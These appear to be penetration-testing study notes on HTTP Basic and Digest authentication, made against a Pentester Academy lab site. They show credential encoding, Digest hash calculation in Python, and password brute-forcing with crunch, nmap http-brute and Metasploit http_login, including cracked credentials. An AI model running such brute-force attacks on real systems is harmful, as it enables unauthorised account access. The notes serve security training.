HTTP Authentication

********************************************************************************************************************

Basics Authentication
Digest Authentication

********************************************************************************************************************

Basics Authentication

https://docs.oracle.com/cd/E19226-01/820-7627/

Request Header:
WWW-Authenticate: Basic realm="PainGames 1.0 :)"\r\n

Response Header:
Authorization: Basic c3Nzc3NzOmFhYWFhYWE=\r\n
Credentials: ssssss:aaaaaaa

In Python
>>> import base64
>>> base64.encodestring("ssssss:aaaaaaa").strip()
'c3Nzc3NzOmFhYWFhYWE='
>>> base64.decodestring("c3Nzc3NzOmFhYWFhYWE=")
'ssssss:aaaaaaa'
>>>

********************************************************************************************************************

Attacking Basics Authentication using Nmap

https://nmap.org/nsedoc/scripts/http-brute.html

$ cat users.txt
admin
nick

$ crunch 5 5 asd > pass.txt
Crunch will now generate the following amount of data: 1458 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 243

$ nmap -p 80 --script http-brute --script-args 'http-brute.hostname=pentesteracademylab.appspot.com,http-brute.method=POST,http-brute.path=/lab/webapp/basicauth,userdb=/root/Desktop/demo/users.txt,passdb=/root/Desktop/demo/pass.txt' -n -v pentesteracademylab.appspot.com

Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2017-03-07 11:20 EST
NSE: Loaded 1 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 11:20
Completed NSE at 11:20, 0.00s elapsed
Initiating Ping Scan at 11:20
Scanning pentesteracademylab.appspot.com (74.125.196.153) [4 ports]
Completed Ping Scan at 11:20, 0.10s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 11:20
Scanning pentesteracademylab.appspot.com (74.125.196.153) [1 port]
Discovered open port 80/tcp on 74.125.196.153
Completed SYN Stealth Scan at 11:20, 0.11s elapsed (1 total ports)
NSE: Script scanning 74.125.196.153.
Initiating NSE at 11:20
Completed NSE at 11:20, 11.25s elapsed
Nmap scan report for pentesteracademylab.appspot.com (74.125.196.153)
Host is up (0.072s latency).
Other addresses for pentesteracademylab.appspot.com (not scanned): 2607:f8b0:4009:800::2014
PORT   STATE SERVICE
80/tcp open  http
| http-brute:
|   Accounts:
|     admin:aaddd - Valid credentials
|_  Statistics: Performed 276 guesses in 11 seconds, average tps: 25.1

NSE: Script Post-scanning.
Initiating NSE at 11:20
Completed NSE at 11:20, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 11.77 seconds
           Raw packets sent: 5 (196B) | Rcvd: 2 (72B)

********************************************************************************************************************

Attacking Basics Authentication using MSF

msf > use auxiliary/scanner/http/http_login
msf auxiliary(http_login) > show options

Module options (auxiliary/scanner/http/http_login):

   Name              Current Setting                  Required  Description
   ----              ---------------                  --------  -----------
   AUTH_URI          /lab/webapp/basicauth            no        The URI to authenticate against (default:auto)
   BLANK_PASSWORDS   false                            no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false                            no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false                            no        Add all passwords in the current database to the list
   DB_ALL_USERS      false                            no        Add all users in the current database to the list
   PASS_FILE         /root/Desktop/demo/pass.txt      no        File containing passwords, one per line
   Proxies                                            no        A proxy chain of format type:host:port[,type:host:port][...]
   REQUESTTYPE       POST                             no        Use HTTP-GET or HTTP-PUT for Digest-Auth, PROPFIND for WebDAV (default:GET)
   RHOSTS            pentesteracademylab.appspot.com  yes       The target address range or CIDR identifier
   RPORT             80                               yes       The target port
   SSL               false                            no        Negotiate SSL/TLS for outgoing connections
   STOP_ON_SUCCESS   true                             yes       Stop guessing when a credential works for a host
   THREADS           20                               yes       The number of concurrent threads
   USERPASS_FILE                                      no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false                            no        Try the username as the password for all users
   USER_FILE         /root/Desktop/demo/users.txt     no        File containing users, one per line
   VERBOSE           true                             yes       Whether to print output for all attempts
   VHOST             pentesteracademylab.appspot.com  no        HTTP server virtual host

msf auxiliary(http_login) > run

********************************************************************************************************************

Digest Authentication RFC 2069

Using Wireshark

Test 1 : Wrong Username and Password
Request:
WWW-Authenticate: Digest realm="Pentester Academy", nonce="470273266c6b6c977ba537e907120a7b", opaque=""\r\n

Response:
Authorization: Digest username="test", realm="Pentester Academy", nonce="470273266c6b6c977ba537e907120a7b", uri="/lab/webapp/digest/1", response="76926c928d02e6ec849bf851ba571190"\r\n

Request:
WWW-Authenticate: Digest realm="Pentester Academy", nonce="c7e8559b799060089252bd52fe9979a6", opaque=" stale=TRUE"\r\n

Test 2 : Correct Username and Password

Request:
Authorization: Digest username="admin", realm="Pentester Academy", nonce="c7e8559b799060089252bd52fe9979a6", uri="/lab/webapp/digest/1", response="0394c2bff12ff17108fbdc2807153064", opaque=" stale=TRUE"\r\n

Response:
Hypertext Transfer Protocol
    HTTP/1.1 200 OK\r\n
    Content-Type: text/html; charset=utf-8\r\n
    Cache-Control: no-cache\r\n
    Content-Encoding: gzip\r\n
    X-Cloud-Trace-Context: c7a9aaa4cfeb659bac17b4e19d6c7c6b;o=1\r\n
    Vary: Accept-Encoding\r\n
    Date: Tue, 07 Mar 2017 17:14:45 GMT\r\n
    Server: Google Frontend\r\n
    Content-Length: 1591\r\n
    Connection: close\r\n
    \r\n
    [HTTP response 1/1]
    [Time since request: 0.171466702 seconds]
    [Request in frame: 18]
    Content-encoded entity body (gzip): 1591 bytes -> 3992 bytes
    File Data: 3992 bytes

Using Python

-> hash1 = MD5(Username:Realm:Password)
-> hash2 = MD5(method:URI)
-> nonce
-> response = MD5(Hash1:Nonce:Hash2)

>>> import hashlib
>>> hash1 = hashlib.md5('admin:Pentester Academy:asdds').hexdigest()
>>> hash1
'2c9ecc3a1be1d6d0138189a4e3bc9195'
>>> hash2 = hashlib.md5('GET:/lab/webapp/digest/1').hexdigest()
>>> hash2
'51b79aa2c26cf4bb3cc8d74c90dc8c22'
>>> nonce = 'c7e8559b799060089252bd52fe9979a6'
>>> response = hashlib.md5('2c9ecc3a1be1d6d0138189a4e3bc9195:c7e8559b799060089252bd52fe9979a6:51b79aa2c26cf4bb3cc8d74c90dc8c22').hexdigest()
>>> response
'0394c2bff12ff17108fbdc2807153064'
>>>

********************************************************************************************************************

Digest Authentication RFC 2617

Using Wireshark

[truncated]Authorization: Digest username="vivek", realm="Pentester-Academy", nonce="cmMXCA/nBAA=7002cad884ece9b87dd63d4a0aa7f3b1cf9f731b", uri="/", algorithm=MD5, response="9444743d2960f562e0145a53cc4e2390", qop=auth, nc=00000001, cnonce

[truncated]Authorization: Digest username="vivek", realm="Pentester-Academy", nonce="cmMXCA/nBAA=7002cad884ece9b87dd63d4a0aa7f3b1cf9f731b", uri="/favicon.ico", algorithm=MD5, response="e53332eeb0f05d36320e5c6845f291e1", qop=auth, nc=00000

[truncated]Authorization: Digest username="vivek", realm="Pentester-Academy", nonce="cmMXCA/nBAA=7002cad884ece9b87dd63d4a0aa7f3b1cf9f731b", uri="/favicon.ico", algorithm=MD5, response="ed7cf5895a9f8e1b71d3a77bef84d6a0", qop=auth, nc=00000

Using Python

-> hash1 = MD5(Username:Realm:Password)
-> hash2 = MD5(method:URI)
-> response = MD5(Hash1:Nonce:NonceCount:Clinet-Nonce:QOP:Hash2)

>>> import hashlib
>>> hash1 = hashlib.md5('vivek:Pentester-Academy:pentesteracademy').hexdigest()
>>> hash1
'4260744fc3c98fd3223426fc152374a4'
>>> hash2 = hashlib.md5('GET:/').hexdigest()
>>> hash2
'71998c64aea37ae77020c49c00f73fa8'
>>> nounce = "cmMXCA/nBAA=7002cad884ece9b87dd63d4a0aa7f3b1cf9f731b"
>>> nounceCount = "00000001"
>>> clientNounce = "c6470d4d075843c9"
>>> qop = "auth"
>>> response_string = hash1 + ":" + nounce + ":" + nounceCount + ":" + clientNounce + ":" + qop + ":" + hash2
>>> response = hashlib.md5(response_string).hexdigest()
>>> response
'9444743d2960f562e0145a53cc4e2390'
>>>

********************************************************************************************************************
